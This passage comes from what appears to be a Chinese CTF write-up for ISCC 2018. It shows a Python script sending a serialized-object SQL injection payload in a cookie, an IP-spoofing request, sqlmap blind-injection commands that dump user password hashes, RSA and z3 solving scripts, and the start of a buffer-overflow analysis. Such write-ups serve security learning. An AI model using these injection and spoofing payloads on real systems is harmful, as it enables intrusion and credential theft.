class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="attr">url="http://118.190.152.202:8020/"</span></span><br><span class="line">def attack(url, payload):</span><br><span class="line">    <span class="attr">s=requests.session()</span></span><br><span class="line">    <span class="attr">u1</span> = url + <span class="string">"send.php"</span></span><br><span class="line">    <span class="attr">plen</span> = len(payload)</span><br><span class="line">    <span class="attr">payload</span> = 'a:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">"email"</span>;O:<span class="number">7</span>:<span class="string">"Message"</span>:<span class="number">4</span>:&#123;s:<span class="number">3</span>:<span class="string">"msg"</span>;s:'+str(plen)+':<span class="string">"'+payload+'"</span>;s:<span class="number">4</span>:<span class="string">"from"</span>;N;s:<span class="number">2</span>:<span class="string">"to"</span>;N;s:<span class="number">2</span>:<span class="string">"id"</span>;i:-<span class="number">1</span>;&#125;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">5</span>:<span class="string">"23333"</span>;&#125;'</span><br><span class="line">    <span class="attr">cookies</span> = &#123;'ckSavePass': base64.b64encode(payload)&#125;</span><br><span class="line">    <span class="attr">r</span> = s.get(u1, <span class="attr">cookies=cookies)</span></span><br><span class="line">    <span class="attr">u2="http://118.190.152.202:8020/"</span> +'config.php'</span><br><span class="line">    <span class="attr">r2=s.get(u2)</span></span><br><span class="line">    print r2.headers['Set-Cookie']</span><br><span class="line">    return False</span><br><span class="line"><span class="attr">payload="111'</span> || <span class="number">1</span>=<span class="number">1</span> -- <span class="number">111</span><span class="string">"</span></span><br><span class="line"><span class="string">attack(url,payload)</span></span><br><span class="line"><span class="string">运行结果：</span></span><br><span class="line"><span class="string">csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly</span></span><br></pre></td></tr></table></figure><h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>进入，</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一关</span><br><span class="line"></span><br><span class="line">第二关需要从 http://edu.xss.tv 进入，并且只有我公司的<span class="built_in">IP</span>地址才可以进入第二关，公司<span class="built_in">IP</span>为：<span class="number">110.110</span><span class="meta">.110</span><span class="meta">.110</span></span><br></pre></td></tr></table></figure><p>伪造IP</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> <span class="number">118.190</span><span class="number">.152</span><span class="number">.202</span>:<span class="number">8016</span></span><br><span class="line"><span class="string">Pragma:</span> no-cache</span><br><span class="line">Cache-<span class="string">Control:</span> no-cache</span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/66.0.3359.181 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span>,en-US;q=<span class="number">0.8</span>,en;q=<span class="number">0.7</span></span><br><span class="line"><span class="string">Cookie:</span> PHPSESSID=b604vp88ds9coh4352d3dncih2</span><br><span class="line">X-Forwarded-<span class="string">For:</span> <span class="number">110.110</span><span class="number">.110</span><span class="number">.110</span></span><br><span class="line"><span class="string">Referer:</span> <span class="string">http:</span><span class="comment">//edu.xss.tv</span></span><br><span class="line"><span class="string">Connection:</span> close</span><br></pre></td></tr></table></figure><p>进入到第二关，寻找密码。右键源码看到<code>password.js</code>，解密其中的base64，得到密码<code>xinyiji.com</code></p><p>flag：B1H3n5u0xI2n9JIscc</p><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>在<code>username</code>存在延迟注入。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">python</span> <span class="string">sqlmap.py</span> <span class="bullet">-r</span> <span class="string">post.txt</span> <span class="bullet">--level</span> <span class="number">3</span> <span class="bullet">--tamper=space2comment</span> <span class="bullet">--time-sec</span> <span class="number">6</span> <span class="bullet">-D</span> <span class="string">"sqli_database"</span> <span class="bullet">-T</span> <span class="string">"user"</span> <span class="bullet">-C</span> <span class="string">"username,pass"</span> <span class="bullet">--dump</span> </span><br><span class="line"><span class="string">sqlmap</span> <span class="string">resumed</span> <span class="string">the</span> <span class="string">following</span> <span class="string">injection</span> <span class="string">point(s)</span> <span class="string">from</span> <span class="string">stored</span> <span class="attr">session:</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">Parameter:</span> <span class="string">username</span> <span class="string">(POST)</span></span><br><span class="line"><span class="attr">    Type:</span> <span class="string">AND/OR</span> <span class="string">time-based</span> <span class="string">blind</span></span><br><span class="line"><span class="attr">    Title:</span> <span class="string">MySQL</span> <span class="string">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span> <span class="string">AND</span> <span class="string">time-based</span> <span class="string">blind</span> <span class="string">(query</span> <span class="string">SLEEP)</span></span><br><span class="line"><span class="attr">    Payload:</span> <span class="string">username=%E2%80%98'</span> <span class="string">AND</span> <span class="string">(SELECT</span> <span class="string">*</span> <span class="string">FROM</span> <span class="string">(SELECT(SLEEP(5)))fbFG)</span> <span class="string">AND</span> <span class="string">'xEit'</span><span class="string">='xEit&amp;password='</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">[15:04:25]</span> <span class="string">[WARNING]</span> <span class="string">changes</span> <span class="string">made</span> <span class="string">by</span> <span class="string">tampering</span> <span class="string">scripts</span> <span class="string">are</span> <span class="string">not</span> <span class="string">included</span> <span class="string">in</span> <span class="string">shown</span> <span class="string">payload</span> <span class="string">content(s)</span></span><br><span class="line"><span class="string">[15:04:25]</span> <span class="string">[INFO]</span> <span class="string">the</span> <span class="string">back-end</span> <span class="string">DBMS</span> <span class="string">is</span> <span class="string">MySQL</span></span><br><span class="line"><span class="string">web</span> <span class="string">server</span> <span class="string">operating</span> <span class="attr">system:</span> <span class="string">Linux</span> <span class="string">Ubuntu</span></span><br><span class="line"><span class="string">web</span> <span class="string">application</span> <span class="attr">technology:</span> <span class="string">Apache</span> <span class="number">2.4</span><span class="number">.7</span><span class="string">,</span> <span class="string">PHP</span> <span class="number">5.5</span><span class="number">.9</span></span><br><span class="line"><span class="string">back-end</span> <span class="attr">DBMS:</span> <span class="string">MySQL</span> <span class="string">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span></span><br><span class="line"><span class="string">运行结果：</span></span><br><span class="line"><span class="attr">Database:</span> <span class="string">sqli_database</span></span><br><span class="line"><span class="attr">Table:</span> <span class="string">user</span></span><br><span class="line"><span class="string">[2</span> <span class="string">entries]</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| username | pass                             |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| test     | 098f6bcd4621d373cade4e832627b4f6 |（test）</span></span><br><span class="line"><span class="string">| admin    | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br></pre></td></tr></table></figure><p>登陆发现提示<code>flag在另一个字段</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D "sqli<span class="emphasis">_database" -T "news" -C "kjafuibafuohnuvwnruniguankacbh" --dump</span></span><br><span class="line"><span class="emphasis">运行结果：</span></span><br><span class="line"><span class="emphasis">Database: sqli_</span>database</span><br><span class="line">Table: news</span><br><span class="line"><span class="meta">[1 entry]</span></span><br><span class="line"><span class="code">+--------------------------------+</span></span><br><span class="line">| kjafuibafuohnuvwnruniguankacbh |</span><br><span class="line"><span class="code">+--------------------------------+</span></span><br><span class="line">| flag&#123;hahaha999999999&#125;          |</span><br><span class="line"><span class="code">+--------------------------------+</span></span><br></pre></td></tr></table></figure><h3 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h3><p>题目：我都过滤了，看你怎么绕。记住是mysql</p><p>只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin</p><p>注入，过滤了<code>空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d</code>等，需要想办法用其他操作符连接注入语句和闭合’。</p><p>原文操作：<a href="https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/" target="_blank" rel="noopener">https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/</a></p><p>得出密码为<code>0416af0a8accf2be556a8e131438b814(nishishabi1438)</code></p><p>登陆之后和原题不一样了，直接填写<code>flag</code>就出现了flag值。</p><p>flag{sql_iNjEct_Is_Easy}</p><h2 id="0x03-Reverse"><a href="#0x03-Reverse" class="headerlink" title="0x03 Reverse"></a>0x03 Reverse</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>三个加密文件一个公钥。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def ModExp(n, k, m):</span><br><span class="line">    a = list(bin(k))[2:]</span><br><span class="line">    a.reverse()</span><br><span class="line">    s = 1</span><br><span class="line">    for i in a:</span><br><span class="line">        if i == '1':</span><br><span class="line">            s = (s * n) % m</span><br><span class="line">        n = (n * n) % m</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">n = int('D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB', 16)</span><br><span class="line">print('n is')</span><br><span class="line">print(n)</span><br><span class="line">p = gmpy2.mpz(302825536744096741518546212761194311477)</span><br><span class="line">q = gmpy2.mpz(325045504186436346209877301320131277983)</span><br><span class="line">e = gmpy2.mpz(65537)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">print(<span class="string">"d is:"</span>)</span><br><span class="line">print(d)</span><br><span class="line">p = 302825536744096741518546212761194311477</span><br><span class="line">q = 325045504186436346209877301320131277983</span><br><span class="line">def ByteToHex( bins ):</span><br><span class="line">    return ''.join( [ <span class="string">"%02X"</span> % x for x in bins ] ).strip()</span><br><span class="line"></span><br><span class="line">file1 = open(<span class="string">"C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1"</span>, 'rb').read()</span><br><span class="line">c1 = int(ByteToHex(file1), 16)</span><br><span class="line">print(<span class="string">"c1"</span>, c1)</span><br><span class="line">file2 = open(<span class="string">"C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2"</span>, 'rb').read()</span><br><span class="line">c2 = int(ByteToHex(file2), 16)</span><br><span class="line">file3 = open(<span class="string">"C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3"</span>, 'rb').read()</span><br><span class="line">c3 = int(ByteToHex(file3), 16)</span><br><span class="line">m = p * q</span><br><span class="line">flag1 = ModExp(c1, d, m)</span><br><span class="line">flag2 = ModExp(c2, d, m)</span><br><span class="line">flag3 = ModExp(c3, d, m)</span><br><span class="line">flag = '0' + hex(flag1)[2:] + '0' + hex(flag2)[2:] + '0' + hex(flag3)[2:]</span><br><span class="line">print(flag)</span><br><span class="line">i = 0</span><br><span class="line">result = ''</span><br><span class="line">for i in range(0, len(flag), 2):</span><br><span class="line">    result += chr((int(flag[i:i+2], 16)))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="My-math-is-bad"><a href="#My-math-is-bad" class="headerlink" title="My math is bad"></a>My math is bad</h3><p>程序地址：<a href="https://pan.baidu.com/s/10q1OftjPKjON15Ijs_RCdw" target="_blank" rel="noopener">My math is bad</a></p><p>题目：I think the math problem is too difficult for me.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">file</span> <span class="keyword">Reverse</span></span><br><span class="line"><span class="keyword">Reverse</span>: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version  <span class="number">1</span> (SYSV), dynamically linked, interpreter <span class="regexp">/lib64/</span>ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, <span class="keyword">for</span> GNU<span class="regexp">/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped</span></span><br></pre></td></tr></table></figure><p>IDA又是不显示main函数</p><p><img src="/image/ISCC-2018/Re2.png" alt=""></p><p>满足<code>sub_400766()</code>就输出<code>sub_400B16()</code>，那就，直接看<code>sub_400B16()</code> ？看了看，不行哦，捷径走不了，那就看<code>sub_400766()</code>里的东西。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(s) == 32 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = unk_6020B0;</span><br><span class="line">  v4 = unk_6020B4;</span><br><span class="line">  v5 = unk_6020B8;</span><br><span class="line">  v6 = unk_6020BC;</span><br><span class="line">  result = 0;</span><br><span class="line"> <span class="built_in"> if </span>( dword_6020A4 * (signed __int64)*(signed<span class="built_in"> int </span>*)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL</span><br><span class="line">    &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed<span class="built_in"> int </span>*)s == 397958918</span><br><span class="line">    &amp;&amp; 3 * *(signed<span class="built_in"> int </span>*)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL</span><br><span class="line">    &amp;&amp; 27LL * dword_6020A4 + *(signed<span class="built_in"> int </span>*)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">   <span class="built_in"> if </span>( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL</span><br><span class="line">      &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL</span><br><span class="line">      &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL</span><br><span class="line">      &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL )</span><br><span class="line">      result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s、dword_<span class="number">6020</span>A<span class="number">4</span>、dword_<span class="number">6020</span>A<span class="number">8</span>、dword_<span class="number">6020</span>AC、</span><br><span class="line">u<span class="symbol">nk_6020</span>B<span class="number">0</span><span class="comment">(v3)</span>、u<span class="symbol">nk_6020</span>B<span class="number">4</span><span class="comment">(v4)</span>、u<span class="symbol">nk_6020</span>B<span class="number">8</span><span class="comment">(v5)</span>、u<span class="symbol">nk_6020</span>BC<span class="comment">(v6)</span></span><br></pre></td></tr></table></figure><p>依次验证，满足条件即返回1，则通过校验。</p><p>详细看看第8-13行，4个未知数和四个方程，emmm。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_6020A4 *s - dword_6020AC * dword_6020A8 == <span class="number">2652042832920173142</span></span><br><span class="line"><span class="number">3</span> * dword_6020A8 + <span class="number">4</span> * dword_6020AC - dword_6020A4 - <span class="number">2</span> * s == <span class="number">397958918</span></span><br><span class="line"><span class="number">3</span> * s * dword_6020AC - dword_6020A8 * dword_6020A4 == <span class="number">3345692380376715070</span></span><br><span class="line"><span class="number">27</span> * dword_6020A4 + s - <span class="number">11</span> * dword_6020AC - dword_6020A8 == <span class="number">40179413815</span></span><br></pre></td></tr></table></figure><p>利用python的<code>z3</code>库</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">dword_6020A4 = Int('dword_6020A4')</span><br><span class="line">dword_6020AC = Int('dword_6020AC')</span><br><span class="line">dword_6020A8 = Int('dword_6020A8')</span><br><span class="line">s = Int('s')</span><br><span class="line"></span><br><span class="line">solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 ,</span><br><span class="line">    3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 ,</span><br><span class="line">    3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 ,</span><br><span class="line">    27 * dword_6020A4 +  s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )</span><br><span class="line">运算结果：</span><br><span class="line">s = 1869639009</span><br><span class="line">dword_6020A4 = 1801073242</span><br><span class="line">dword_6020A8 = 829124174</span><br><span class="line">dword_6020AC = 862734414</span><br></pre></td></tr></table></figure><p>接下来到异或运算，直接用<code>C语言</code>吧</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int v1,v2,v7,v8,v9,v10,v11,v12;</span><br><span class="line"></span><br><span class="line">int main(void) &#123; </span><br><span class="line">srand(829124174 ^ 1801073242 ^ 1869639009 ^ 862734414);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">printf(<span class="string">" v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d"</span>,v1,v2,v7,v8,v9,v10,v11,v12);</span><br><span class="line"><span class="built_in">return </span>0;</span><br><span class="line">&#125;</span><br><span class="line">运算结果：</span><br><span class="line">v1=22 </span><br><span class="line">v2=39 </span><br><span class="line">V7=45 </span><br><span class="line">v8=45 </span><br><span class="line">v9=35 </span><br><span class="line">v10=41 </span><br><span class="line">v11=13 </span><br><span class="line">v12=36</span><br></pre></td></tr></table></figure><p>然后继续接下来的方程</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">v3 = Int('v3')</span><br><span class="line">v4 = Int('v4')</span><br><span class="line">v5 = Int('v5')</span><br><span class="line">v6 = Int('v6')</span><br><span class="line"></span><br><span class="line">solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,</span><br><span class="line">v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,</span><br><span class="line">v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,</span><br><span class="line">v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)</span><br><span class="line">运算结果：</span><br><span class="line">v3 = 811816014</span><br><span class="line">v4 = 828593230</span><br><span class="line">v5 = 1867395930</span><br><span class="line">v6 = 1195788129</span><br></pre></td></tr></table></figure><p>将数字串转换成字符串。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-<span class="number">8</span></span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = ""</span><br><span class="line">x = [<span class="number">1869639009</span>,<span class="number">1801073242</span>,<span class="number">829124174</span>,<span class="number">862734414</span>,<span class="number">811816014</span>,<span class="number">828593230</span>,<span class="number">1867395930</span>,<span class="number">1195788129</span>]</span><br><span class="line">for y in x:</span><br><span class="line">    flag += libnum.n2s(y)[::-<span class="number">1</span>]</span><br><span class="line">    print flag</span><br><span class="line">运算结果：</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br></pre></td></tr></table></figure><p>得出正确的输入值，输入输出</p><p><img src="/image/ISCC-2018/Re2-1.png" alt=""></p><h2 id="0x04-PWN"><a href="#0x04-PWN" class="headerlink" title="0x04 PWN"></a>0x04 PWN</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目：nc 47.104.16.75 9000</p><p>程序地址：<a href="https://pan.baidu.com/s/1fcY68iZ-gZqyF9x-njScKA" target="_blank" rel="noopener">Pwn-Login</a></p><p>下载附件倒入<code>IDA</code>进行分析</p><p>程序运行过程：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main<span class="function"><span class="params">()</span>--&gt;</span>Login<span class="function"><span class="params">()</span>--&gt;</span>Menu<span class="function"><span class="params">()</span>--&gt;</span>ExecCmd<span class="function"><span class="params">()</span>--&gt;</span>ShowUserlist()...</span><br></pre></td></tr></table></figure><p>查看<code>Login()</code>内容，总的看没什么特别的，接下来看<code>Menu()</code></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@<span class="number">6</span></span><br><span class="line">  char buf[<span class="number">68</span>]<span class="comment">; // [sp+0h] [bp-50h]@1</span></span><br><span class="line">  int v2; // [sp+44h] [bp-Ch]@<span class="number">2</span></span><br><span class="line">  __int64 v3; // [sp+48h] [bp-8h]@<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  memset(<span class="name">buf</span>, <span class="number">0</span>, <span class="number">0</span>x40uLL)<span class="comment">;</span></span><br><span class="line">  v3 = <span class="number">0</span>LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">"\nPanel\n\n1. exec command\n2. show user list\n3. exit\n"</span>)<span class="comment">;</span></span><br><span class="line">        printf(<span class="string">"Your choice: "</span>)<span class="comment">;</span></span><br><span class="line">        fflush(<span class="name">_bss_start</span>)<span class="comment">;</span></span><br><span class="line">        v2 = read(<span class="number">0</span>, buf, <span class="number">0</span>x280uLL)<span class="comment">;</span></span><br><span class="line">        buf[v2] = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">        if ( buf[<span class="number">0</span>] != <span class="number">49</span> )</span><br><span class="line">          break;</span><br><span class="line">        ExecCmd()<span class="comment">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      if ( buf[<span class="number">0</span>] != <span class="number">50</span> )</span><br><span class="line">        break;</span><br><span class="line">      ShowUserlist(<span class="number">0</span>LL, buf)<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = (<span class="name">unsigned</span> __int8)buf[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  while ( 